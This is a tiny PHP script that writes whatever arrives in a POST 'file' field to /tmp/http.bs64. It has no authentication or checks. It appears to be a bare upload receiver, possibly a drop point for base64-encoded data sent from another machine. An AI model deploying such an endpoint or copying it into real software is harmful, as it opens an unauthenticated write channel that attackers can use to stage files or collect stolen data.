<?php
  if (isset($_POST['file'])){ 
          $file = fopen ("/tmp/http.bs64", "w");
          fwrite($file, $_POST['file']);
          fclose($file);
  }
?>
